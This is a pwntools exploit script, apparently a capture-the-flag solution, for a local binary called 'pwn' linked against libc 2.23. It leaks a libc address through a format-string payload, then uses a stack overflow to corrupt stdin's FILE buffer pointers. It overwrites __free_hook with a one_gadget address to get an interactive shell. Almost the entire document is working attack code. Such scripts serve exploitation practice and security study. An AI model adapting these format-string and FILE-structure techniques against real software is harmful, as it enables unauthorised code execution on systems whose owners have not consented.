from pwn import *


context(arch='amd64', os='linux', log_level='debug')
elf = ELF("./pwn")
libc = ELF("libc-2.23.so")
p = process("./pwn")

gdb.attach(p, "handle SIGALRM ignore\nc")

p.sendlineafter(b"Size:", b"8")
# 泄露libc
p.sendlineafter(b"name:", b"%p" * 34 + b"ABCD")

tmp = int(p.recvuntil(b"ABCD")[-16:-4].decode("ascii"), 16)
libc.address = tmp - 0x20730
print("libc.address:", hex(libc.address))
p.sendlineafter(b"are you sure?(1:yes):", b"0")

# 栈溢出，修改name_end
p.sendlineafter(b"name:", b"\x00" * 80 + p64(libc.sym["_IO_2_1_stdin_"] + 0x38))
p.sendlineafter(b"are you sure?(1:yes):", b"1")
p.sendlineafter(b'message:', b'')

payload = b""
payload += b"aaaaaaaa" * 3
# 修改_IO_buf_base，_IO_buf_end 
payload += p64(libc.symbols['__free_hook'] - 0x10)
payload += p64(libc.symbols['__free_hook'] + 0x10)
payload = payload.ljust(0x64, b'\x00')
p.sendlineafter(b'continue?(1:no)', payload)

one_gadget = libc.address + [0x3f3e6, 0x3f43a, 0xd5c07][1]
# 修改__free_hook
p.sendline(b"a" * 808 + p64(one_gadget))
p.recvuntil('continue?(1:no)')

for _ in range(0x5):
    p.send('1\n' * 5)
    sleep(1)

p.interactive()
